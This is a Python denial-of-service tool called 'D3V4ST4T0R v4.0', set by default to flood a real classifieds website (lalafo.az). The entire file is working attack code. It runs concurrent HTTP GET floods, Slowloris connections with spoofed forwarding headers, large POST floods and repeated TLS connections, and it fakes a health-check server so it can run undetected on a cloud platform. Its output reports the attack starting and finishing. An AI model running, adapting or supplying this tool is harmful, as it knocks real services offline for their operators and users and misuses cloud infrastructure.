import asyncio
import aiohttp
import ssl
import random
import time
import os
import sys
import signal
from urllib.parse import urlparse

# === CONFIG FROM ENV ===
TARGET = os.getenv("TARGET", "lalafo.az")
PORT = int(os.getenv("PORT", "443"))
SSL = os.getenv("SSL", "true").lower() == "true"
THREADS = int(os.getenv("THREADS", "500"))  # 500 concurrent tasks — safe for Railway
DURATION = int(os.getenv("DURATION", "120"))  # seconds

TARGET_URL = f"{'https' if SSL else 'http'}://{TARGET}:{PORT}/"
BANNER = f"""
███████████████████████████████████████████████████████████████████████████
█  D3V4ST4T0R v4.0 — Railway Asyncio Edition                            █
█  Target: {TARGET_URL[:70]:<70}█
█  Tasks: {THREADS:<5} | Duration: {DURATION}s | Port: {PORT:<5}         █
███████████████████████████████████████████████████████████████████████████
"""

METHODS = [
    "http_flood",
    "slowloris",
    "post_flood",
    "ssl_reneg",
]

# === HTTP Flood (GET) ===
async def http_flood(session, method_idx):
    """Rapid GET requests"""
    paths = [
        "/", "/az", "/en", "/ru",
        "/search", "/ads", "/categories",
        "/login", "/register", "/post-ad",
        f"/?r={random.randint(1,999999)}",
    ]
    user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15",
        "Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36",
    ]
    headers = {
        "User-Agent": random.choice(user_agents),
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "az,en-US;q=0.9,en;q=0.8,ru;q=0.7",
        "Cache-Control": "no-cache, no-store, must-revalidate",
        "Pragma": "no-cache",
        "Referer": f"https://{TARGET}/{random.choice(['', 'az', 'en', 'ru'])}",
    }
    while True:
        try:
            path = random.choice(paths)
            url = f"{'https' if SSL else 'http'}://{TARGET}:{PORT}{path}"
            async with session.get(url, headers=headers, timeout=aiohttp.ClientTimeout(total=10)) as resp:
                await resp.read()
            return True
        except:
            return False

# === Slowloris ===
async def slowloris(session, method_idx):
    """Slowloris — send headers slowly"""
    user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
    ]
    while True:
        try:
            # Open connection via raw TCP since aiohttp doesn't do partial headers well
            reader, writer = await asyncio.wait_for(
                asyncio.open_connection(TARGET, PORT, ssl=ssl.create_default_context() if SSL else None),
                timeout=15
            )
            request = (
                f"POST / HTTP/1.1\r\n"
                f"Host: {TARGET}\r\n"
                f"User-Agent: {random.choice(user_agents)}\r\n"
                f"Content-Length: 1000000\r\n"
                f"X-Forwarded-For: {random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}\r\n"
            )
            writer.write(request.encode())
            await writer.drain()
            # Hold connection open, trickle data slowly
            for _ in range(random.randint(10, 30)):
                writer.write(f"X-keep-alive: {random.randint(1,99999999)}\r\n".encode())
                await writer.drain()
                await asyncio.sleep(random.uniform(5, 15))
            writer.close()
            await writer.wait_closed()
        except:
            try:
                writer.close()
            except:
                pass
            await asyncio.sleep(1)

# === POST Flood ===
async def post_flood(session, method_idx):
    """Large POST requests"""
    while True:
        try:
            # Generate random payload
            payload_size = random.randint(10000, 100000)
            payload = "".join(random.choices("abcdefghijklmnopqrstuvwxyz0123456789&=", k=payload_size))
            data = f"username=admin&password=admin&description={payload}&submit=1"
            headers = {
                "Content-Type": "application/x-www-form-urlencoded",
                "User-Agent": f"Mozilla/5.0 (compatible; D3V4ST4T0R/{random.randint(1,9)}.{random.randint(0,9)})",
            }
            url = f"{'https' if SSL else 'http'}://{TARGET}:{PORT}/search"
            async with session.post(url, data=data, headers=headers, timeout=aiohttp.ClientTimeout(total=10)) as resp:
                await resp.read()
        except:
            pass

# === SSL Renegotiation ===
async def ssl_reneg(session, method_idx):
    """SSL/TLS renegotiation attempt — opens many SSL connections"""
    while True:
        try:
            ctx = ssl.create_default_context()
            # Insecure but aggressive
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            ctx.set_ciphers('ALL:@SECLEVEL=0')
            reader, writer = await asyncio.wait_for(
                asyncio.open_connection(TARGET, PORT, ssl=ctx),
                timeout=15
            )
            # Send garbage to cause SSL processing overhead
            for _ in range(5):
                try:
                    writer.write(b"GET / HTTP/1.1\r\nHost: %s\r\n\r\n" % TARGET.encode())
                    await writer.drain()
                    await asyncio.sleep(0.1)
                except:
                    break
            writer.close()
            await writer.wait_closed()
        except:
            await asyncio.sleep(0.5)

# === Health Check Server (for Railway) ===
async def health_server():
    """Simple HTTP server for Railway health checks on port 8080"""
    try:
        reader, writer = await asyncio.wait_for(
            asyncio.start_server(
                lambda r, w: asyncio.create_task(handle_health(r, w)),
                host="0.0.0.0", port=8080
            ),
            timeout=5
        )
        print(f"[+] Health check server running on port 8080")
        return writer  # server instance
    except Exception as e:
        print(f"[!] Health server: {e}")
        return None

async def handle_health(reader, writer):
    response = b"HTTP/1.1 200 OK\r\nContent-Length: 2\r\n\r\nOK"
    writer.write(response)
    await writer.drain()
    writer.close()
    await writer.wait_closed()

# === Main ===
async def worker_pool():
    """Create task pool and distribute work"""
    connector = aiohttp.TCPConnector(
        limit=0,           # no connection limit
        force_close=True,  # close connections aggressively
        ttl_dns_cache=0,   # no DNS cache
        verify_ssl=False,
        use_dns_cache=False,
    )
    
    timeout = aiohttp.ClientTimeout(total=0)  # no timeout
    
    async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
        tasks = []
        method_cycle = 0
        
        for i in range(THREADS):
            method = METHODS[method_cycle % len(METHODS)]
            method_cycle += 1
            
            if method == "http_flood":
                task = http_flood(session, 0)
            elif method == "slowloris":
                task = slowloris(session, 1)
            elif method == "post_flood":
                task = post_flood(session, 2)
            elif method == "ssl_reneg":
                task = ssl_reneg(session, 3)
            
            tasks.append(asyncio.create_task(task))
            
            # Spread out creation slightly to avoid thundering herd
            if i % 50 == 0:
                await asyncio.sleep(0.01)
        
        print(f"  [+] Launched {len(tasks)} attack tasks\n")
        
        # Let run for duration
        await asyncio.sleep(DURATION)
        
        # Cancel all tasks
        for t in tasks:
            t.cancel()
        
        print("\n[✓] Attack complete. All tasks stopped.")

async def main():
    print(BANNER)
    print(f"[+] Resolving {TARGET}...")
    
    # DNS resolution test
    try:
        import socket
        ips = socket.getaddrinfo(TARGET, PORT)
        print(f"  [+] Resolved to: {list(set(ip[4][0] for ip in ips))}")
    except Exception as e:
        print(f"  [!] DNS resolution failed: {e}")
        sys.exit(1)
    
    print(f"[+] Starting attack with {THREADS} concurrent tasks for {DURATION}s")
    print(f"  [+] Methods: {', '.join(METHODS)}")
    print(f"  [+] URL: {TARGET_URL}")
    print()
    
    # Start health server
    health_task = asyncio.create_task(health_server())
    
    # Start attack
    try:
        await worker_pool()
    except asyncio.CancelledError:
        print("\n[!] Attack cancelled")
    
    print("[✓] Done.")

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\n[!] Interrupted by user")
        sys.exit(0)
